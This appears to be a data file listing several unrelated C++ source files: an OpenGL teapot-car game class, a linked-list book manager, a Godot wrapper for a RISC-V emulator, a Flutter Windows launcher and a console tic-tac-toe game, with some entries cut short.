    "#include <complex>\n#include <glut.h>\n#define _USE_MATH_DEFINES\n#include <math.h>\n#include \"Player.h\"\n#include \"SystemMain.h\"\n\nPlayer::Player() : x(0.0), y(0.0), z(0.0),velY(0.0), angleY(-M_PI / 2), speed(0.0), speedMax(1.0), accel(0.01), brake(0.02), handling(0.2 * M_PI / 360), handleAngle(0.0), handleAngleMax(8 * M_PI / 360) {\n    lightSwitch = true;\n    lightChanged = false;\n    fuel = 200;\n    fuelMax = 200;\n    fuelMeter.setFuel(fuel);\n    fuelMeter.setFuelMax(fuelMax);\n    headLight.setLightNumber(1);\n    pedalAccel.setCheckKey(0);\n    pedalAccel.setX(-1.0);\n    pedalAccel.setY(-2.6f);\n    pedalAccel.setScaleX(0.3);\n    pedalAccel.setScaleY(0.8);\n    pedalBrake.setCheckKey(1);\n    pedalBrake.setX(1.0);\n    pedalBrake.setY(-2.6f);\n    pedalBrake.setScaleX(0.35);\n    pedalBrake.setScaleY(0.5);\n}\n\nvoid Player::draw() {\n    glPushMatrix(); {\n        GLfloat mat0ambi[] = { 0.329412,  0.223529, 0.027451, 1.0 };//\u771f\u936e\n        glMaterialfv(GL_FRONT_AND_BACK, GL_AMBIENT, mat0ambi); //\u74b0\u5883\u5149\u306e\u53cd\u5c04\u7387\u3092\u8a2d\u5b9a\n        GLfloat mat0diff[] = { 0.780392,  0.568627, 0.113725, 1.0 };//\u771f\u936e\n        glMaterialfv(GL_FRONT_AND_BACK, GL_DIFFUSE, mat0diff); //\u62e1\u6563\u5149\u306e\u53cd\u5c04\u7387\u3092\u8a2d\u5b9a\n        GLfloat mat0spec[] = { 0.992157,  0.941176, 0.807843, 1.0 };//\u771f\u936e\n        glMaterialfv(GL_FRONT_AND_BACK, GL_SPECULAR, mat0spec); //\u93e1\u9762\u5149\u306e\u53cd\u5c04\u7387\u3092\u8a2d\u5b9a\n        GLfloat mat0shine[] = { 27.89743616 };//\u771f\u936e\n        glMaterialfv(GL_FRONT_AND_BACK, GL_SHININESS, mat0shine);\n        GLfloat materialEmission[] = { 0.0, 0.0, 0.0, 1.0 };\n        glMaterialfv(GL_FRONT_AND_BACK, GL_EMISSION, materialEmission);\n        //\u81ea\u6a5f\u306e\u63cf\u753b\n        glTranslatef(x, y, z); //\u4f4d\u7f6e\u5909\u6570\u3092\u3082\u3068\u306b\u79fb\u52d5\n        glRotatef(angleY * (180 / M_PI) + 1.5 * handleAngle * (180 / M_PI), 0.0, 1.0, 0.0);  //Y\u8ef8\u307e\u308f\u308a\u306bangleY(\u30e9\u30b8\u30a2\u30f3)\u56de\u8ee2 handleAngle\u3082\u8003\u616e\n        glutSolidTeapot(1.0);            //\u81ea\u6a5f\u306f\u30c6\u30a3\u30fc\u30dd\u30c3\u30c8(\u7b11)\n    }glPopMatrix();\n\n    headLight.draw();\n}\n\nvoid Player::drawInfo() {\n    shiftLever.draw();\n    drawHandle();\n    pedalAccel.draw();\n    pedalBrake.draw();\n    drawSpeed();\n}\n\nvoid Player::drawInfo2D() {\n    carNavi.draw();\n    fuelMeter.draw();\n}\n\nvoid Player::drawHandle() {\n    glPushMatrix(); {       //\u30cf\u30f3\u30c9\u30eb\n        GLfloat mat0ambi[] = { 0.1,  0.1, 0.1, 1.0 };//\u9ed2\u76ae\n        glMaterialfv(GL_FRONT_AND_BACK, GL_AMBIENT, mat0ambi); //\u74b0\u5883\u5149\u306e\u53cd\u5c04\u7387\u3092\u8a2d\u5b9a\n        GLfloat mat0diff[] = { 0.1,  0.1, 0.1, 1.0 };//\u9ed2\u76ae\n        glMaterialfv(GL_FRONT_AND_BACK, GL_DIFFUSE, mat0diff); //\u62e1\u6563\u5149\u306e\u53cd\u5c04\u7387\u3092\u8a2d\u5b9a\n        GLfloat mat0spec[] = { 0.1,  0.1, 0.1, 1.0 };//\u9ed2\u76ae\n        glMaterialfv(GL_FRONT_AND_BACK, GL_SPECULAR, mat0spec); //\u93e1\u9762\u5149\u306e\u53cd\u5c04\u7387\u3092\u8a2d\u5b9a\n        GLfloat mat0shine[] = { 27.89743616 };//\u9ed2\u76ae\n        glMaterialfv(GL_FRONT_AND_BACK, GL_SHININESS, mat0shine);\n        //\u30cf\u30f3\u30c9\u30eb\u306e\u63cf\u753b\n        glPushMatrix(); {\n            //glTranslatef(x - 5 * cos(angleY), y + 0.5, z + 5 * sin(angleY)); //\u4f4d\u7f6e\u5909\u6570\u3092\u3082\u3068\u306b\u79fb\u52d5\n            glTranslatef(0.0f, -2.1f, 0.0f);\n            glPushMatrix(); {\n                //glRotatef(angleY * (180 / M_PI) + 90, 0.0, 1.0, 0.0);  //Y\u8ef8\u5468\u308a\u306bangleY(\u30e9\u30b8\u30a2\u30f3)\u56de\u8ee2\n                glRotatef(HandelRate * -handleAngle * (180 / M_PI), 0.0, 0.0, 1.0);  //Z\u8ef8\u5468\u308a\u306bangleY(\u30e9\u30b8\u30a2\u30f3)\u56de\u8ee2\n                glutSolidTorus(0.1, 0.6, 5, 40);            //\u30cf\u30f3\u30c9\u30eb\u306e\u5916\u5074\n                glPushMatrix(); {\n                    glTranslatef(0.3 * cos(M_PI / 2), 0.3 * sin(M_PI / 2), 0.0); //\u30cf\u30f3\u30c9\u30eb\u306e\u4e2d\u8eab1\n                    glRotatef(90, 0.0, 0.0, 1.0);\n                    glScalef(0.6, 0.2, 0.2);\n                    glutSolidCube(0.8);\n                }glPopMatrix();\n                glPushMatrix(); {\n                    glTranslatef(0.3 * cos(7 * M_PI / 6), 0.3 * sin(7 * M_PI / 6), 0.0); //\u30cf\u30f3\u30c9\u30eb\u306e\u4e2d\u8eab2\n                    glRotatef(210, 0.0, 0.0, 1.0);\n                    glScalef(0.6, 0.2, 0.2);\n                    glutSolidCube(0.8);\n                }glPopMatrix();\n                glPushMatrix(); {\n                    glTranslatef(0.3 * cos(11 * M_PI / 6), 0.3 * sin(11 * M_PI / 6), 0.0); //\u30cf\u30f3\u30c9\u30eb\u306e\u4e2d\u8eab2\n                    glRotatef(330, 0.0, 0.0, 1.0);\n                    glScalef(0.6, 0.2, 0.2);\n                    glutSolidCube(0.8);\n                }glPopMatrix();\n                glutSolidTorus(0.2, 0.0, 5, 10);            //\u30cf\u30f3\u30c9\u30eb\u306e\u4e2d\u5fc3\n            }glPopMatrix();\n        }glPopMatrix();\n    }glPopMatrix();\n}\n\nvoid Player::drawSpeed() {\n    glPushMatrix(); {       //\u30b9\u30d4\u30fc\u30c9\u30e1\u30fc\u30bf\u30fc\n        GLfloat mat0ambi[] = { 0.59225,  0.19225, 0.19225, 1.0 };//\u8d64\n        GLfloat mat0diff[] = { 0.60754,  0.50754, 0.50754, 1.0 };\n        GLfloat mat0spec[] = { 0.608273,  0.508273, 0.508273, 1.0 };\n        GLfloat mat0shine[] = { 51.2 };\n        glMaterialfv(GL_FRONT_AND_BACK, GL_AMBIENT, mat0ambi); //\u74b0\u5883\u5149\u306e\u53cd\u5c04\u7387\u3092\u8a2d\u5b9a\n        glMaterialfv(GL_FRONT_AND_BACK, GL_DIFFUSE, mat0diff); //\u62e1\u6563\u5149\u306e\u53cd\u5c04\u7387\u3092\u8a2d\u5b9a\n        glMaterialfv(GL_FRONT_AND_BACK, GL_SPECULAR, mat0spec); //\u93e1\u9762\u5149\u306e\u53cd\u5c04\u7387\u3092\u8a2d\u5b9a\n        glMaterialfv(GL_FRONT_AND_BACK, GL_SHININESS, mat0shine);\n\n        // \u63cf\u753b\n        glTranslatef(0.3 * -cos(( 150 * (speed / speedMax) - 225) * (M_PI / 180)), 0.3 * -sin((150 * (speed / speedMax) - 225) * (M_PI / 180)), 0.0);\n        glPushMatrix(); {\n            glTranslatef(-2.0, -2.1f, 0.0)",
    "#include \"linklist.h\"\r\n#include <fstream>\r\n#include <string.h>\r\n\r\ntemplate<class T>\r\nLinklist<T>::Linklist()\r\n{\r\n\tstart=nullptr;\r\n\tint i=1;\r\n\tifstream out(\"manju.bin\",ios_base::binary);\r\n\tif(out)\r\n\t{\r\n\twhile(!out.eof())\r\n\t{\r\n\t\t\r\n\t\tT obj; //Obj of book\r\n\t\tout.read((char*)&obj,sizeof(obj));\r\n\t\tif(out.eof())\r\n\t\t{\r\n\t\t\tbreak;\r\n\t\t}\t\r\n\t\tinsertBookPos(obj,i);\r\n\t\ti++;\r\n\t}\r\n\tout.close();\r\n\t}\r\n}\r\n\t\r\ntemplate<class T>\r\nvoid Linklist<T>::insertBookPos(T &data, int pos)\r\n\t{\r\n\t\tNode<T>* temp= new Node<T>(data); \r\n\t\tif(start == nullptr)   ///when nullptr\r\n\t\t{\r\n\t\t\tstart=temp;\r\n\t\t\treturn;\r\n\t\t} \r\n\t\tif(pos==1)     //insert at beggining\r\n\t\t{\r\n\t\t\ttemp->setNext(start);\r\n\t\t\tstart=temp;\r\n\t\t\treturn;\r\n\t\t}\r\n\t\tint i=1;   //insert at any position  \r\n\t\tNode<T>* p=start;\r\n\t\twhile(i<pos-1 && p->getNext()!=nullptr)\r\n\t\t{\r\n\t\t\tp=p->getNext();\r\n\t\t\ti++;\r\n\t\t}\r\n\t\ttemp->setNext(p->getNext());\r\n\t\tp->setNext(temp);\r\n\t}\r\n\r\ntemplate<class T>\t\r\nvoid Linklist<T>::display()\r\n\t{\r\n\t\tif(start == nullptr)\r\n\t\t{\r\n\t\t\tcout<<\"\\nNo nodes to display.\";\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tNode<T>* p=start;\r\n\t\t\twhile(p!=nullptr)\r\n\t\t\t{\r\n\t\t\t\tp->getdata().displayBook();\r\n\t\t\t\tp = p->getNext();\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\t\r\ntemplate<class T>\t\r\nNode<T>* Linklist<T>::searchById(int id)\r\n\t{\r\n\t\tif(start==NULL)\r\n\t\t{\r\n\t\t\treturn NULL;\r\n\t\t}\r\n\t\telse\r\n\t\t{\r\n\t\t\tNode<T>* p=start;\r\n\t\t\twhile(p!=NULL)\r\n\t\t\t{\r\n\t\t\t\tif(p->getdata().getId()==id)\r\n\t\t\t\t{\r\n\t\t\t\t    return p;\r\n\t\t\t    }\r\n\t\t\t\tp=p->getNext();\r\n\t\t\t}\r\n\t\t}\r\n\t\treturn NULL;\r\n\t}\r\n\r\ntemplate<class T>\t\t\r\nvoid Linklist<T>::display2(Node<T>* i)\r\n{\r\n\ti->getdata().displayBook();\r\n}\r\n\t\r\ntemplate<class T>\t\r\nbool Linklist<T>::deletebyId(int id)\r\n\t{\r\n\t\tif(start==NULL)\r\n\t\t{\r\n\t\t\treturn false;\r\n\t\t}\r\n\t    Node<T>* p=start;\r\n\t\tif(p->getdata().getId()==id)\r\n\t\t{\r\n\t\t\tstart=p->getNext();\r\n\t\t\tdelete p;\r\n\t\t\treturn true;\r\n\t\t} \r\n\t\twhile(p->getNext()!=NULL)\r\n\t\t{\r\n\t\t\tNode<T>* q=p->getNext();\r\n\t\t\tif(q->getdata().getId()==id)\r\n\t\t\t{\r\n\t\t\t\tp->setNext(q->getNext());\r\n\t\t\t\tdelete q;\r\n\t\t\t\treturn true;\r\n\t\t\t}\r\n\t        p=p->getNext();\r\n\t\t} \r\n\t\treturn false;\r\n\t}\r\n\r\n\t\r\ntemplate<class T>\t\r\nbool Linklist<T>::updateBook(int id)\r\n{\r\n\tNode<T>* i=searchById(id);\r\n\tif(i==NULL)\r\n\t{\r\n\t\treturn false;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tint op;\r\n\t\tdouble price,ratings;\r\n\t\ti->getdata().displayBook();\r\n\t\tcout<<\"\\nEnter what you want to update:\\n1. Price \\n2. Ratings\\n\";\r\n\t    cin>>op;\r\n\t    if(op==1)\r\n\t    {\r\n\t\t    cout<<\"\\nEnter updated price of book :\";\r\n\t\t    cin>>price;\r\n\t\t    Book b=i->getdata();\r\n\t\t    b.setPrice(price);\r\n\t\t    i->setdata(b);\r\n\t\t    return true;\r\n\t    }\r\n\t    else if(op==2)\r\n\t    {\r\n\t    \tcout<<\"\\nEnter updated rating of book :\";\r\n\t\t    cin>>ratings;\r\n\t\t    Book b=i->getdata();\r\n\t\t    b.setratings(ratings);\r\n\t\t    i->setdata(b);\r\n\t\t    return true;\r\n\t\t}\r\n\t    else\r\n\t    {\r\n\t        cout<<\"\\nInvalid choice...\";\r\n\t    }\r\n\t}\r\n}\r\n\t\r\ntemplate<class T>\t\r\nvoid Linklist<T>::top3PriceBooks()\r\n{\r\n\tint i,count=0;\r\n\tBook temp;\r\n\tif(start==NULL)\r\n\t{\r\n\t\tcout<<\"\\nLinkedlist is empty\";\r\n\t\treturn;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tLinklist ll2;\r\n\t\tNode<T>* p=start;\r\n\t\tfor(int i=1;p!=NULL;i++)\r\n\t\t{\r\n\t\t\tll2.insertBookPos(p->getdata(),i);\r\n\t\t\tp=p->getNext();\r\n\t\t\tcount++;\r\n\t\t}\r\n\t\tcout<<\"no of nodes=\"<<count;\r\n\t\tfor(Node<T>* p=ll2.start;p->getNext()!=NULL;p=p->getNext())\r\n\t\t{\r\n\t\t\tfor(Node<T>* q=p->getNext();q!=NULL;q=q->getNext())\r\n\t\t\t{\r\n\t\t\t\tif(p->getdata().getPrice()<q->getdata().getPrice())\r\n\t\t\t\t{\r\n\t\t\t\t\ttemp=p->getdata();\r\n\t\t\t\t\tp->setdata(q->getdata());\r\n\t\t\t\t\tq->setdata(temp);\t\r\n\t\t\t\t}\r\n\t\t\t}\r\n\t\t}\r\n\t\tint i=0;\r\n\t\tp=ll2.start;\r\n\t\twhile(i<3 && i<count)\r\n\t\t{\r\n\t\t\tp->getdata().displayBook();\r\n\t\t\tp=p->getNext();\r\n\t\t\ti++;\r\n\t\t}\r\n    }\r\n}\r\n\t\r\n//template<class T>\r\n//Linklist<T>::~Linklist()\r\n//\t{\r\n//\t\twhile(start!=nullptr)\r\n//\t\t{\r\n//\t\t\tNode<T>* p= start;\r\n//\t\t\tstart=p->getNext();\r\n//\t\t\tdelete p;\r\n//\t\t}\t\r\n//\t}\r\n\r\n//template<class T>\r\n//Linklist<T>::~Linklist()\r\n//{\r\n//\tNode<T>*p;\r\n//\tofstream out(\"manju.bin\",ios_base::binary);\r\n//\twhile(start != NULL){\r\n//\t\tp=start;\r\n//\t\tout.write((char*)&(start->getdata()),sizeof(start->getdata()));\r\n//\t\tstart=start->getNext();\r\n//\t\tdelete p;\r\n//\t}\r\n//\tout.close();\r\n//}\r\n\r\ntemplate<class T>\r\nLinklist<T>::~Linklist()\r\n{\r\n\tNode<T>*p=start;\r\n\tofstream out(\"manju.bin\",ios_base::binary);\r\n\twhile(p != NULL){\r\n\t\tT obj=p->getdata();\r\n\t\tout.write((char*)&obj,sizeof(obj));\r\n\t\tp=p->getNext();\r\n\t\tcout<<endl;\r\n\t}\r\n\tout.close();\r\n\tp=start;\r\n\twhile(start != NULL)\r\n\t{\r\n\t\tstart = start->getNext();\r\n\t\tdelete p;\r\n\t\tp=start;\r\n\t\tcout<<\"\\nDestructor is called!!!!!!!!!!!!\";\r\n\t}\r\n}\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n",
    "#include \"riscv.hpp\"\n\n#include <godot_cpp/core/class_db.hpp>\n\n#include <godot_cpp/classes/global_constants.hpp>\n#include <godot_cpp/classes/label.hpp>\n#include <godot_cpp/variant/utility_functions.hpp>\n\nusing namespace godot;\n\nString RiscvEmulator::_to_string() const\n{\n\treturn \"[ GDExtension::RiscvEmulator <--> Instance ID:\" + uitos(get_instance_id()) + \" ]\";\n}\n\nvoid RiscvEmulator::_bind_methods()\n{\n\t// Methods.\n\tClassDB::bind_method(D_METHOD(\"load\"), &RiscvEmulator::load);\n\tClassDB::bind_method(D_METHOD(\"exec\"), &RiscvEmulator::exec);\n}\n\nRiscvEmulator::RiscvEmulator()\n{\n\t// In order to reduce checks we guarantee that this\n\t// class is well-formed at all times.\n\tthis->m_machine = new machine_t { };\n\tthis->m_name = \"(name)\";\n\tUtilityFunctions::print(\"Constructor.\");\n}\n\nRiscvEmulator::~RiscvEmulator()\n{\n\tUtilityFunctions::print(\"Destructor.\");\n\tdelete this->m_machine;\n}\n\n// Methods.\nconst String& RiscvEmulator::name()\n{\n\treturn this->m_name;\n}\n\nvoid RiscvEmulator::load(const PackedByteArray& buffer, const TypedArray<String>& arguments)\n{\n\tUtilityFunctions::print(\"Loading file from buffer\");\n\n\tm_binary = std::vector<uint8_t> {buffer.ptr(), buffer.ptr() + buffer.size()};\n\n\tdelete this->m_machine;\n\tthis->m_machine = new machine_t { this->m_binary };\n\tmachine_t& m = machine();\n\n\tm.setup_minimal_syscalls();\n\tm.setup_argv({\"program\"});\n}\nvoid RiscvEmulator::exec()\n{\n\tmachine_t& m = machine();\n\n\tUtilityFunctions::print(\"Simulating...\");\n\tm.simulate(MAX_INSTRUCTIONS);\n\tUtilityFunctions::print(\"Done, instructions: \", m.instruction_counter(),\n\t\t\" result: \", m.return_value<int64_t>());\n}\n\nGDExtensionInt RiscvEmulator::call(String function)\n{\n\tconst auto ascii = function.ascii();\n\tconst std::string_view sview {ascii.get_data(), (size_t)ascii.length()};\n\tgaddr_t address = 0x0;\n\n\tmachine().reset_instruction_counter();\n\ttry\n\t{\n\t\taddress = machine().address_of(sview);\n\t\treturn machine().vmcall<MAX_INSTRUCTIONS>(address);\n\t}\n\tcatch (const std::exception& e)\n\t{\n\t\tthis->handle_exception(address);\n\t}\n\treturn -1;\n}\n\nvoid RiscvEmulator::handle_exception(gaddr_t address)\n{\n\tauto callsite = machine().memory.lookup(address);\n\tUtilityFunctions::print(\n\t\t\"[\", name(), \"] Exception when calling:\\n  \", callsite.name.c_str(), \" (0x\",\n\t\tString(\"%x\").format(callsite.address), \")\\n\", \"Backtrace:\\n\");\n\t//this->print_backtrace(address);\n\n\ttry\n\t{\n\t\tthrow; // re-throw\n\t}\n\tcatch (const riscv::MachineTimeoutException& e)\n\t{\n\t\tthis->handle_timeout(address);\n\t\treturn; // NOTE: might wanna stay\n\t}\n\tcatch (const riscv::MachineException& e)\n\t{\n\t\tconst String instr (machine().cpu.current_instruction_to_string().c_str());\n\t\tconst String regs  (machine().cpu.registers().to_string().c_str());\n\n\t\tUtilityFunctions::print(\n\t\t\t\"\\nException: \", e.what(), \"  (data: \", String(\"%x\").format(e.data()), \")\\n\",\n\t\t\t\">>> \", instr, \"\\n\",\n\t\t\t\">>> Machine registers:\\n[PC\\t\", String(\"%x\").format(machine().cpu.pc()),\n\t\t\t\"] \", regs, \"\\n\");\n\t}\n\tcatch (const std::exception& e)\n\t{\n\t\tUtilityFunctions::print(\"\\nMessage: \", e.what(), \"\\n\\n\");\n\t}\n\tUtilityFunctions::print(\n\t\t\"Program page: \", machine().memory.get_page_info(machine().cpu.pc()).c_str(),\n\t\t\"\\n\");\n\tUtilityFunctions::print(\n\t\t\"Stack page: \", machine().memory.get_page_info(machine().cpu.reg(2)).c_str(),\n\t\t\"\\n\");\n}\n\nvoid RiscvEmulator::handle_timeout(gaddr_t address)\n{\n\tthis->m_budget_overruns++;\n\tauto callsite = machine().memory.lookup(address);\n\tUtilityFunctions::print(\n\t\t\"RiscvEmulator: Timeout for '\", callsite.name.c_str(),\n\t\t\"' (Timeouts: \", m_budget_overruns, \"\\n\");\n}\n\nvoid RiscvEmulator::print(std::string_view text)\n{\n\tString str(static_cast<std::string> (text).c_str());\n\tif (this->m_last_newline) {\n\t\tUtilityFunctions::print(\"[\", name(), \"] says: \", str);\n\t}\n\telse {\n\t\tUtilityFunctions::print(str);\n\t}\n\tthis->m_last_newline = (text.back() == '\\n');\n}\n\ngaddr_t RiscvEmulator::address_of(std::string_view name) const\n{\n\treturn machine().address_of(name);\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"favorit_places\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include<iostream>\r\n#include<time.h>\r\n#include<stdlib.h>\r\n//22-cs-178,Sarim Ammad\r\nusing namespace std;\r\n\r\n//Global Variable Declarations\r\nint r, c;\r\nchar grid[3][3];\r\nbool draw=false, is_ai=0;\r\nint turn=0;\r\nchar symbol;\r\n\r\n//Function Prototyping\r\nvoid showboard();\r\nbool gameover();\r\nvoid moves();\r\nvoid resetboard();\r\n\r\nint main()\r\n{\r\n\tint p1score=0, p2score=0,cscore=0, pscore=0;\r\n\tbool replay=1;\r\n\tint command;\r\n\twhile(command!=3)\r\n\t{\r\n\t\tresetboard();\r\n\t\tsystem(\"CLS\");\r\n\t\tcout<<\"\\n\\n\\n\\t\\t\\t\\t\\t\\t\\tTIC-TAC-TOE\\n\\n\\n\\n\\n\";\r\n\t\tcout<<\"\\t\\t 1) Player vs Player \\n\\n\\n\\t\\t 2) Player vs Computer \\n\\n\\n\\t\\t 3) Quit\\n\";\r\n\t\tcout<<\"\\n\\n\\n\\t\\t > \";\r\n\t\tcin>>command;\r\n\t\treplay = 1;\r\n\t\tswitch (command)\r\n\t\t{\r\n\t\t\tcase 1:\r\n\t\t\t\twhile (replay)\r\n\t\t\t\t{\r\n\t\t\t\t\tis_ai=0;\r\n\t\t\t\t\tturn=0;\r\n\t\t\t\t\tresetboard();\r\n\t\t\t\t\twhile (!gameover())\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tmoves();\r\n\t\t\t\t\t\t++turn;\r\n\t\t\t\t\t}\r\n\t\t\t\t\tshowboard();\r\n\t\t\t\t\tif (draw)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tcout<<\"\\n\\t\\t\\t\\tThe game was a draw :(\\n\";\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse if (symbol=='X')\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tcout<<\"\\n\\t\\t\\t\\tPlayer 1 Won!\"<<endl;\r\n\t\t\t\t\t\t++p1score;\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tcout<<\"\\n\\t\\t\\t\\tPlayer 2 Won!\"<<endl;\r\n\t\t\t\t\t\t++p2score;\r\n\t\t\t\t\t}\r\n\t\t\t\t\tsystem(\"pause\");\r\n\t\t\t\t\tsystem(\"cls\");\r\n\t\t\t\t\tcout<<\"Player 1 Score: \"<<p1score<<endl;\r\n\t\t\t\t\tcout<<\"Player 2 Score: \"<<p2score<<endl;\r\n\t\t\t\t\tsystem(\"pause\");\r\n\t\t\t\t\tcout<<\"Do you wish to continue? (Enter 1 for Yes & 0 for No)\"<<endl;\r\n\t\t\t\t\tcin>>replay;\r\n\t\t\t\t}\r\n\t\t\t\tbreak;\r\n\t\t\t\r\n\t\t\tcase 2:\r\n\t\t\t\tis_ai=1;\r\n\t\t\t\twhile (replay)\r\n\t\t\t\t{\r\n\t\t\t\t\tturn=0;\r\n\t\t\t\t\tresetboard();\r\n\t\t\t\t\twhile (!gameover())\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tmoves();\r\n\t\t\t\t\t\t++turn;\r\n\t\t\t\t\t}\r\n\t\t\t\t\tshowboard();\r\n\t\t\t\t\tif (draw)\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tcout<<\"\\n\\t\\t\\t\\tThe game was a draw :(\\n\";\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse if (symbol=='X')\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tcout<<\"\\n\\t\\t\\t\\tPlayer 1 Won!\"<<endl;\r\n\t\t\t\t\t\t++pscore;\r\n\t\t\t\t\t}\r\n\t\t\t\t\telse\r\n\t\t\t\t\t{\r\n\t\t\t\t\t\tcout<<\"\\n\\t\\t\\t\\tComputer has Won!\"<<endl;\r\n\t\t\t\t\t\t++cscore;\r\n\t\t\t\t\t}\r\n\t\t\t\t\tsystem(\"pause\");\r\n\t\t\t\t\tsystem(\"cls\");\r\n\t\t\t\t\tcout<<\"Player 1 Score: \"<<p1score<<endl;\r\n\t\t\t\t\tcout<<\"Computer Score: \"<<cscore<<endl;\r\n\t\t\t\t\tsystem(\"pause\");\r\n\t\t\t\t\tcout<<\"Do you wish to continue? (Enter 1 for Yes & 0 for No)\"<<endl;\r\n\t\t\t\t\tcin>>replay;\r\n\t\t\t\t}\r\n\t\t}\r\n\t}\r\n\treturn 0;\r\n}\r\n\r\n//Basic function to show board\r\nvoid showboard()\r\n{\r\n\tsystem(\"CLS\");\r\n\tcout<<\"\\n\\t\\t\\t\\t\\t\\t   TIC-TAC-TOE \\n\\n\\n\\n\";\r\n\tif (turn==0)\r\n\t{\r\n\t\tcout<<\"\\t\\t\\t\\t\\t\\t     |     |     \\n\";\r\n    \tcout<<\"\\t\\t\\t\\t\\t\\t  1  |  2  |  3  \\n\";\r\n    \tcout<<\"\\t\\t\\t\\t\\t\\t_____|_____|_____\\n\";\r\n    \tcout<<\"\\t\\t\\t\\t\\t\\t     |     |     \\n\";\r\n    \tcout<<\"\\t\\t\\t\\t\\t\\t  4  |  5  |  6  \\n\";\r\n    \tcout<<\"\\t\\t\\t\\t\\t\\t_____|_____|_____\\n\";\r\n    \tcout<<\"\\t\\t\\t\\t\\t\\t     |     |     \\n\";\r\n    \tcout<<\"\\t\\t\\t\\t\\t\\t  7  |  8  |  9  \\n\";\r\n    \tcout<<\"\\t\\t\\t\\t\\t\\t     |     |     \\n\";\r\n\t}\r\n\telse\r\n\t{\r\n\t\tcout<<\"\\t\\t\\t\\t\\t\\t     |     |     \\n\";\r\n    \tcout<<\"\\t\\t\\t\\t\\t\\t  \"<<grid[0][0]<<\"  |  \"<<grid[0][1]<<\"  |  \"<<grid[0][2]<<\" \\n\";\r\n    \tcout<<\"\\t\\t\\t\\t\\t\\t_____|_____|_____\\n\";\r\n    \tcout<<\"\\t\\t\\t\\t\\t\\t     |     |     \\n\";\r\n    \tcout<<\"\\t\\t\\t\\t\\t\\t  \"<<grid[1][0]<<\"  |  \"<<grid[1][1]<<\"  |  \"<<grid[1][2]<<\" \\n\";\r\n    \tcout<<\"\\t\\t\\t\\t\\t\\t_____|_____|_____\\n\";\r\n    \tcout<<\"\\t\\t\\t\\t\\t\\t     |     |     \\n\";\r\n    \tcout<<\"\\t\\t\\t\\t\\t\\t  \"<<grid[2][0]<<\"  |  \"<<grid[2][1]<<\"  |  \"<<grid[2][2]<<\" \\n\";\r\n    \tcout<<\"\\t\\t\\t\\t\\t\\t     |     |     \\n\";\r\n\t}\r\n}\r\n\r\n//reset board each time we start game\r\nvoid resetboard()\r\n{\r\n\tfor (int i = 0; i<3; i++)\r\n\t{\r\n\t\tfor (int j = 0; j<3; j++)\r\n\t\t{\r\n\t\t\tgrid[i][j]=' ';\r\n\t\t}\r\n\t}\r\n}\r\n\r\n//Function to make moves\r\nvoid moves()\r\n{\r\n\tshowboard();\r\n\tint choice;\r\n\tif (turn%2==0)\r\n\t{\r\n\t\tsymbol='X';\r\n\t\tcout<<\"\\n\\n\\t\\t\\tPlayer 1's Turn: \";\r\n\t}\r\n\telse\r\n\t{\r\n\t\tsymbol='O';\r\n\t\tcout<<\"\\n\\n\\t\\t\\tPlayer 2's Turn: \";\r\n\t}\r\n\tif ((is_ai)&&(symbol=='O'))\r\n\t{\r\n\t\tsrand(time(NULL));\r\n\t\tchoice = (rand()%(9-1+1)+1);\r\n\t}\r\n\telse\r\n\t{\r\n\t\tcin>>choice;\r\n\t}\r\n\t--choice;\r\n\tr=choice/3;\r\n\tc=choice-(3*r);\r\n\tif (grid[r][c]==' ')\r\n\t{\r\n\t\tgrid[r][c]=symbol;\r\n\t}\r\n\telse\r\n\t{\r\n\t\tcout<<\"\\aChoose correct move\";\r\n\t\tmoves();\r\n\t}\r\n}\r\n\r\n\r\nbool gameover()\r\n{\r\n\tdraw=false;\r\n\tfor (int i = 0; i<3; i++)\r\n\t{\r\n\t\tif ((grid[i][0]==grid[i][1])&&(grid[i][1]==grid[i][2])&&(grid[i][0]!=' '))\r\n\t\t{\r\n\t\t\treturn true;\r\n\t\t}\r\n\t\telse if ((grid[0][i]==grid[1][i])&&(grid[1][i]==grid[2][i])&&(grid[0][i]!=' '))\r\n\t\t{\r\n\t\t\treturn true;\r\n\t\t}\r\n\t}\r\n\tif 